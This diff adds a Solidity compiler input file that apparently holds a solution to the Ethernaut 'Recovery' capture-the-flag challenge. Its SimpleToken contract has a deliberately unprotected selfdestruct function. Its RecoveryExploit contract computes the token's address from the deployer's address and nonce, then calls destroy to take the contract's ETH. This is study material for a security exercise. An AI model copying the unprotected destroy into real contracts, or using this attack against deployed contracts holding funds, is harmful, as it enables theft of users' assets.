@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Recovery.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Recovery {\n    //-n address simple token\n    //-n this is not part of the contest - I'm just storing it to write a test case\n    address public token;\n\n    //-n constructor to receive eth\n    constructor() payable {}\n\n    //generate tokens\n    function generateToken(string memory _name, uint256 _initialSupply) public {\n        token = address(new SimpleToken(_name, msg.sender, _initialSupply)); //-n this is added just to recoed token address\n    }\n\n    //-n added this function to execute a eth transfer to simple token contract to mint more tokens\n    function mintTokensforEth() public {\n        (bool success, ) = payable(token).call{value: address(this).balance}(\"\");\n        require(success, \"invalid transfer\");\n    }\n}\n\ncontract RecoveryExploit {\n    //-n key challenge in this contract to back compute the address of the SimpleToken contract deployed by Recovery address\n    //-n we use the deterministic formula below to get the address deployed by sender at a given nonce\n    function getDeployedContractAddress(address sender, uint8 nonce) public pure returns (address) {\n        return\n            address(\n                uint160(\n                    uint256(\n                        keccak256(\n                            abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(nonce))\n                        )\n                    )\n                )\n            );\n    }\n\n    //-n get the simple token at a given address\n    //-n call destroy function to transfer all ETH in the simple token contract to Recovery contract\n    function destroySimpleToken(address addr, uint8 nonce) public {\n        SimpleToken s = SimpleToken(payable(getDeployedContractAddress(addr, nonce)));\n\n        s.destroy(payable(addr));\n    }\n}\n\ncontract SimpleToken {\n    string public name;\n    mapping(address => uint) public balances;\n\n    // constructor\n    constructor(string memory _name, address _creator, uint256 _initialSupply) {\n        name = _name;\n        balances[_creator] = _initialSupply;\n    }\n\n    // collect ether in return for tokens\n    receive() external payable {\n        balances[msg.sender] = msg.value * 10;\n    }\n\n    // allow transfers of tokens\n    function transfer(address _to, uint _amount) public {\n        require(balances[msg.sender] >= _amount);\n        balances[msg.sender] = balances[msg.sender] - _amount;\n        balances[_to] = _amount;\n    }\n\n    // clean up after ourselves\n    function destroy(address payable _to) public {\n        selfdestruct(_to);\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
